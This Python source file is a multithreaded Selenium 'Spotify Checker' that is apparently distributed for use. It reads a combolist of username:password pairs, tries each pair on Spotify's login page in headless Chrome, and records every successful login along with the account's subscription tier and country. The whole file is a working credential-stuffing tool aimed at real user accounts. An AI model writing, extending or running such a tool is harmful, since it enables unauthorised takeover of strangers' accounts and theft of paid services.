from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from tkinter.filedialog import askopenfilename
from tkinter import Tk
import datetime

import time, os 

from threading import Thread, RLock
import random
from colorama import init
from colorama import Fore, Style
import os, sys, time, traceback, pickle, random, colorama
from sys import stdout

verrou = RLock()
Tk().withdraw()
init()

bad = 0
good = 0
lignes_count = 0
combo_filename = 0
threads_count = 0
chrome_options = ' '
headless_mode = True

def clear():
    
    os.system("cls" if os.name == "nt" else "echo -e \\\\033c")
    os.system("mode con: cols=105 lines=30")

def logo():
    try:
        text = """                                   
                        ███████╗██████╗  ██████╗ ████████╗██╗███████╗██╗   ██╗      
                        ██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝██║██╔════╝╚██╗ ██╔╝      
                        ███████╗██████╔╝██║   ██║   ██║   ██║█████╗   ╚████╔╝      
                        ╚════██║██╔═══╝ ██║   ██║   ██║   ██║██╔══╝    ╚██╔╝   
                        ███████║██║     ╚██████╔╝   ██║   ██║██║        ██║    
                        ╚══════╝╚═╝      ╚═════╝    ╚═╝   ╚═╝╚═╝        ╚═╝   - BY TEILAW\n
        """
        bad_colors = ['LIGHTYELLOW_EX', 'YELLOW']
        codes = vars(colorama.Fore)
        colors = [codes[color] for color in codes if color in bad_colors]
        colored_chars = [random.choice(colors) + char for char in text]
        print(''.join(colored_chars))
        print(Fore.RESET + "\t\t\t          Follow Me on Youtube: Dr. Teilaw\n")

    except KeyboardInterrupt:
        sys.exit()

try:
    # Python 2
    xrange
except NameError:
    # Python 3
    xrange = range

class Spotify_checker:
    def __init__(self, combo, rep):
        global chrome_options
        global headless_mode

        self.combo = combo
        self.result_rep = rep

        self.chrome_options = webdriver.ChromeOptions()
        self.chrome_options.add_experimental_option("excludeSwitches", ["enable-logging"])

        if headless_mode == True:
            self.chrome_options.add_argument("--headless")
        elif headless_mode == False:
            pass
        else:
            pass
        
        
        self.driver = webdriver.Chrome(options = self.chrome_options)

        self.result = {'Wrong' : 0, 'Other' : [0, ""],'Free' : [0, ""],'Premium' : [0, ""],'Premium Duo': [0, ""],'Student' : [0, ""],'Family Owner' : [0, ""], 'Family Member' : [0, ""]} 
        
        self.verify_combo()
        
        self.driver.quit()
        
        
    def verify_combo(self):
        
        for a in self.combo:
            
            if (self.verify_account(a[0],a[1]) == -1):
                print("[ERROR]: {0}:{1}".format(a[0],a[1]))
    
    def verify_account(self, u, p):
        global bad
        global good
        global lignes_count

        os.system('title ' + ' Spotify Checker by Teilaw#0001 ~ Checking [{}/{}] - Hits: {} - Bad: {}'.format(good + bad, lignes_count, good, bad))
        self.driver.get("https://accounts.spotify.com/en/login")
        
        wait = WebDriverWait(self.driver, 3)
        try:
            wait.until(EC.presence_of_element_located((By.ID, 'login-username')))
        except:
            self.driver.get("https://www.spotify.com/logout")
            return -1
    
        user = self.driver.find_element_by_id("login-username")
        user.clear()
        user.send_keys(u)
        self.driver.find_element_by_id("login-password").send_keys(p)
        self.driver.find_element_by_class_name("btn-green").click()
        
        wait = WebDriverWait(self.driver, 3)

        try:
            wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="account-settings-link"]'))).click()
            time.sleep(1)
        except:
            bad += 1
            print(Fore.RED + '[BAD]: ' + u + ':' + p + Fore.RESET)
            self.result["Wrong"] += 1
            return 0

        try:
            cookie = self.driver.find_element_by_xpath('//*[@id="onetrust-accept-btn-handler"]').click()
            time.sleep(1)
        except:
            pass
        try:
            account_statut = self.driver.find_element_by_xpath('//*[@id="your-plan"]/section/div/div[1]/div[1]/span')
            time.sleep(2)
        except NoSuchElementException:
            print('{}[>] {}Account Status Error {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
            self.driver.get("https://www.spotify.com/logout")
            return -2
        
        if(account_statut.text == u"Spotify Free"):
            a_c = "Free"

        elif(account_statut.text == u"Spotify Premium Duo"):
            a_c = "Premium Duo"
            
        elif(account_statut.text == u"Spotify Premium"):
            a_c = "Premium"
            
        elif(account_statut.text == u"Premium for Students"): 
            a_c = "Student"
        
        elif (account_statut.text == u"Spotify Premium Family"):
            try :
                t = self.driver.find_element_by_xpath("//div[@id='account-csr-container']/div[1]/article[2]/section[1]/div[1]/div[2]/div[1]/div[1]/div[2]/div/h3").text
                if t == u"Payment":
                    a_c = "Family Owner"
            except:
                a_c = "Family Member"
                
        else:
            a_c = "Other"
        
        try: 
            country = self.driver.find_element_by_xpath('//*[@id="__next"]/div/div/div[2]/div[3]/div[2]/div/article[1]/section/table/tbody/tr[4]/td[2]').text
        except:
            pass

        good += 1
        print(Fore.GREEN + '[HIT]: ' + u + ':' + p + ' | ' + 'Capture: ' + a_c + ' | ' + 'Country: ' + country + Fore.RESET)
        self.result[a_c][0] += 1
        self.result[a_c][1] += "{0}:{1} | {2}\n".format(u,p,country)
        self.save_data("{0}:{1} | {2}\n".format(u,p,country), a_c)
        
        self.driver.get("https://www.spotify.com/logout")
        self.driver.delete_all_cookies()
        
        return 1
    
        
    def save_data(self, data, data_t):
       
        with verrou :
            with open('{0}/{1}.txt'.format(self.result_rep,data_t), 'a') as f: 
                f.write( data )
                f.close()
        

class ThreadedTask( Thread ):
    def __init__(self, func, *args):
        
        Thread.__init__(self)
        self.func = func
        self.args = args
        
    def run(self):
        
        self.result_task = self.func(*self.args)
        return 1
    
    
class Main:

    def __init__(self,combo_list, thread):
        
        start_time = time.time()
        
        self.thread_nb = thread
        self.combo_list_f = combo_list
        self.load_combo()
        self.create_rep()
        
        if (self.thread_nb == 1 or len(self.combo) < 10) :
            self.Thread  = Spotify_checker(self.combo, self.result_rep)
            self.result = self.Thread.result
            
        else:
            combo_part = int(len(self.combo)/self.thread_nb)
            
            self.Thread = [ ThreadedTask(Spotify_checker, self.combo[i * combo_part : (i *combo_part) + combo_part] if i != self.thread_nb -1 else self.combo[i * combo_part : (i * combo_part) + combo_part + self.thread_nb % len(self.combo)], self.result_rep ) for i in xrange(self.thread_nb)]
            
            for t in self.Thread: 
                t.start()
            for t in self.Thread:
                t.join()
                       
            self.result = {}
            for T in self.Thread:
                for key, value in T.result_task.result.items():
                    self.result[key] = self.result[key] + value if type(value) == int and key in self.result.keys() else [self.result[key][0] + value[0], self.result[key][1] + value[1]] if key in self.result.keys() and type(value) == list else [value[0],value[1]] if type(value)==list else value  
            
            print('  ')
            print(Fore.RESET + "[>] " + Fore.LIGHTYELLOW_EX + "Finished in: %s secondes ---" % datetime.timedelta(seconds=time.time() - start_time ))
            print(Fore.RESET)


    def load_combo(self):
        
        with open(self.combo_list_f, 'r') as f:
            self.combo = [ [i.split(':')[0], i.split(':')[1]] for i in f.read().split('\n') ]
    
    def create_rep(self):
        
        if not os.path.isdir('results/'):
            os.makedirs('results')
            
        self.result_rep = 'results/'+time.strftime("%Y-%m-%d %Hh%M")
        try:
            os.makedirs(self.result_rep)
        except FileExistsError:
            pass

def opencombo():
    global combo_filename
    while True:
        combo_filename = askopenfilename(filetypes =(("Text File", "*.txt"),("All Files","*.*")), title = "Open your combolist.")
        try:
            with open(combo_filename,'r') as UseFile:
                print(Fore.RESET + '[>] ' + Fore.LIGHTYELLOW_EX + combo_filename + Fore.RESET) 
            break
        except:
           print('{}[>] {}"Non-existent file" {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
           time.sleep(1)
           continue

def threads_number():
    global threads_count
    while True:
        try:
            threads_count = input('{}\n[>] {}How many Threads ?: {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
            threads_count = int(threads_count)
            if threads_count > 20:
                print('{}\n[>] {}You have entered too many Threads!{}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
                continue
            elif threads_count <= 20:
                break
        except:
            continue
            

if __name__ == "__main__":
    try:
        clear()
        logo()
        print('{}\n[>] {}Press enter to open your combolist {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
        input()
        opencombo()
        while True:
            headless = input(str('{}\n[>] {}Headless mode ? (hide browser windows) {}[Y/N]: '.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET)))
            if headless == "Y":
                headless_mode = True
                break
            elif headless == "N":
                headless_mode = False
                pass
                break
            else:
                print('{}\n[>] {}Type only Y or N{}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
                continue
        lignes_count = sum(1 for _ in open(combo_filename))
        threads_number()
        time.sleep(1)
        clear()
        logo()
        print('{}\n[>] {}Starting... {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
        print('  ')
        main = Main(combo_filename, threads_count)
    except KeyboardInterrupt:
        sys.exit()